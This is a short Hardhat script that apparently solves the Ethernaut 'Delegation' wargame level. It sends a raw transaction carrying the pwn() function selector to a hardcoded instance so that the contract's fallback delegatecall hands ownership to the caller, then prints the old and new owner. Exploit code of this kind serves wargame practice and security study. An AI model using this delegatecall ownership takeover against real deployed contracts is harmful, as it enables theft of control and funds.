const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const DelegationContract = await hre.ethers.getContractFactory("Delegation");
  // attach your instance address
  const Instance = "0xB575586449aD712e78710FaAeCa8cb849768044a";
  const Delegation = DelegationContract.attach(Instance);
  const oldOwner = await Delegation.owner();

  const fnSelector = "0xdd365b8b";

  const tx = await owner.sendTransaction({
    to: Delegation.address,
    data: fnSelector,
    gasLimit: hre.ethers.BigNumber.from(`100000`),
  });
  await tx.wait(1);

  const newOwner = await Delegation.owner();
  console.log(oldOwner, newOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
